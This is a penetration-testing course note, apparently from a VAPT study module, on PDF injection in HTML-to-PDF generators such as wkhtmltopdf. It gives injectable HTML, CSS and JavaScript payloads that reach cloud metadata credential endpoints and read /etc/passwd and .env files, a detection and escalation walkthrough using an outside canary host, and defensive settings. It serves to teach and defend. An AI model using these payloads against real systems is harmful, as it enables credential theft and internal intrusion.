---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.16 PDF Injection"
---

# 10.16 — PDF Injection

## What is PDF Injection?

PDF Injection occurs when user-controlled input is embedded in PDF generation — either via HTML-to-PDF converters (wkhtmltopdf, headless Chrome, Prince) or direct PDF libraries. Since these tools often render HTML/CSS/JavaScript, they can be exploited for SSRF, file read, or data exfiltration.

```
ATTACK SURFACE:
  App generates PDF from user content:
  - Invoice with user's name/address
  - Report with user-submitted data
  - Certificate with user's name
  - PDF preview of user-uploaded HTML
  
  If user input is HTML → SSRF via <img src="http://internal-server/">
  If user input processed by JavaScript renderer → SSRF, file read, etc.
```

---

## SSRF via PDF Injection

```html
<!-- INJECT INTO USER INPUT FIELD THAT APPEARS IN PDF: -->

<!-- SSRF — INTERNAL HOST PROBE: -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- SSRF — INTERNAL NETWORK SCAN: -->
<img src="http://192.168.1.1/">
<img src="http://10.0.0.1:8080/">

<!-- SSRF VIA CSS: -->
<style>
  body { background: url("http://169.254.169.254/latest/meta-data/"); }
</style>

<!-- IFRAME FOR CONTENT: -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JAVASCRIPT (if renderer executes JS): -->
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
x.send();
document.write(x.responseText);
</script>
<!-- The response gets embedded in the PDF! -->
```

---

## File Read via PDF Injection

```html
<!-- LOCAL FILE INCLUSION VIA FILE:// PROTOCOL: -->
<img src="file:///etc/passwd">

<!-- CSS FILE READ: -->
<style>
  @import "file:///etc/passwd";
</style>

<!-- IFRAME FILE READ: -->
<iframe src="file:///etc/passwd"></iframe>

<!-- JAVASCRIPT FILE READ (if JS enabled): -->
<script>
var r = new XMLHttpRequest();
r.open('GET', 'file:///etc/passwd', false);
r.send();
document.write(r.responseText);
</script>

<!-- INCLUDE LOCAL FILE IN PDF BODY: -->
<link rel="stylesheet" href="file:///var/www/html/.env">
<!-- The .env file's content may be interpreted as CSS, but URL requests are made! -->
```

---

## wkhtmltopdf Specifics

```
wkhtmltopdf IS ESPECIALLY VULNERABLE:
  - Renders HTML using a headless WebKit browser
  - Supports JavaScript execution (by default!)
  - Supports external URL loading
  - Supports file:// protocol
  
DANGEROUS wkhtmltopdf SETTINGS:
  --allow [path]        → restricts file access (not default!)
  --disable-javascript  → disables JS (not default in old versions!)
  --no-local-file-access → disables file:// (safer!)
  
BY DEFAULT (old wkhtmltopdf):
  - file:// ALLOWED
  - JavaScript ENABLED
  - External URL loading ENABLED
  → Triple whammy for attacks!

TEST:
  If PDF contains your injected <img> content → SSRF confirmed!
  If PDF shows /etc/passwd contents → file read confirmed!
```

---

## Detecting PDF Injection

```bash
# STEP 1: FIND PDF GENERATION FEATURES:
# Look for: Download invoice, Export report, Print PDF, Certificate generation

# STEP 2: INJECT CANARY IN USER INPUT:
# Enter in fields that appear in PDF:
<img src="https://your-interactsh.com/pdf-test">

# STEP 3: DOWNLOAD THE GENERATED PDF:
# If Interactsh receives a request → PDF injection confirmed!

# STEP 4: ESCALATE TO FILE READ:
<img src="file:///etc/passwd">
# Open PDF in viewer — does it show /etc/passwd contents?

# STEP 5: ESCALATE TO SSRF:
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
# Check PDF contents for AWS credentials!

# MANUAL BURP TEST:
# Intercept the "generate PDF" request
# Modify user-controlled fields to inject HTML
# Download and inspect the PDF
```

---

## Impact

```
SEVERITY: High to Critical

IMPACTS:
  ✓ SSRF → internal network access, cloud metadata
  ✓ Local file read → credentials, private keys, configs
  ✓ AWS metadata exposure → IAM tokens → full AWS compromise!
  ✓ SSRF to RCE via Redis/internal service exploitation
  
REAL CASE:
  Shopify bug bounty: PDF export → SSRF → internal metadata server
  → Exposed internal infrastructure!
```

---

## Defense

```
PROTECTION:
  1. Use wkhtmltopdf with safe options:
     --no-local-file-access
     --disable-javascript
     --disable-external-links
  
  2. Run PDF generator in isolated environment (Docker/sandbox)
     with no access to internal network!
  
  3. Validate and sanitize HTML before passing to PDF generator:
     Strip: <script>, <iframe>, <object>, <embed>
     Strip: src= attributes that start with file:// or http://internal
  
  4. Use allow list for URLs in PDF content (only same-origin images)
  
  5. Consider using headless Chrome with --disable-web-security=false
     and proper network restrictions
  
  6. Render in a network-isolated container:
     No outbound internet + no access to 169.254.169.254 (metadata)
```

---

## Related Notes
- [[Module 12 - SSRF]] — SSRF exploitation
- [[Module 13 - File Upload]] — file-based attacks
- [[08 - Command Injection via Filename]] — command injection in file processing
